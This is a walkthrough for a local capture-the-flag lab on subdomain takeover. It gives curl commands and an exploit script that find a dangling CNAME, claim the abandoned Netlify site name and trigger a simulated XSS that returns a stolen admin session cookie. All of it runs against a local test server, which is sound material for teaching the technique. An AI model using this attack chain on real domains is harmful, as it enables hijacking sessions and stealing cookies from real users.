# Subdomain Takeover: Full Walkthrough

## Setup

```
docker compose up --build -d
```

Verify:

```
curl -s http://127.0.0.1:8112/
```

Output: DNS Subdomain Scanner home page.

## Step 1: Find the dangling CNAME

```
curl -s "http://127.0.0.1:8112/dns/check?domain=assets.example.com"
```

Output:

```json
{
  "cname": "example-company.netlify.app",
  "domain": "assets.example.com",
  "flag1": "POC{<hex>}",
  "status": "DANGLING",
  "vulnerable": true
}
```

**Flag 1** is in the `flag1` field. Note the `cname` value for the next step.

## Step 2: Claim the subdomain

```
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"site_name":"example-company.netlify.app"}' \
  http://127.0.0.1:8112/claim
```

Output:

```json
{"message":"Site registered successfully","site":"example-company.netlify.app","status":"claimed"}
```

## Step 3: Trigger XSS to steal the cookie

```
curl -s http://127.0.0.1:8112/xss-test
```

Output:

```json
{
  "executed": true,
  "flag2": "POC{<hex>}",
  "stolen_cookie": "admin_session=abc123; admin_flag=POC{<hex>}"
}
```

**Flag 2** is in the `flag2` field.

## Automated exploit

```
python3 exploit/exploit.py http://127.0.0.1:8112
```

Output:

```
[*] Target: http://127.0.0.1:8112

[+] Dangling CNAME found: assets.example.com -> example-company.netlify.app
[+] Flag 1: POC{<hex>}
[+] Site claimed: example-company.netlify.app
[+] XSS executed on claimed subdomain
[+] Stolen cookie: admin_session=abc123; admin_flag=POC{<hex>}
[+] Flag 2: POC{<hex>}

[+] Exploit complete
    Flag 1: POC{<hex>}
    Flag 2: POC{<hex>}
```

## Full attack chain

```
Attacker
  |
  v
GET /dns/check?domain=assets.example.com
  |
  |-- CNAME: assets.example.com -> example-company.netlify.app
  |-- Status: DANGLING (Netlify site deleted, DNS record kept)
  |
  v
Flag 1 captured from DNS check response
  |
  v
POST /claim  {"site_name": "example-company.netlify.app"}
  |
  |-- Attacker registers the name on Netlify
  |-- DNS now resolves assets.example.com to attacker's deployment
  |
  v
GET /xss-test
  |
  |-- Attacker's JS runs in assets.example.com context
  |-- Reads cookies scoped to .example.com
  |
  v
Flag 2 captured: admin session cookie stolen
```

## Tools used

| Tool | Purpose |
|------|---------|
| curl | DNS check, claim, XSS trigger |
| exploit.py | Automated three-step exploit |

## Teardown

```
docker compose down
```
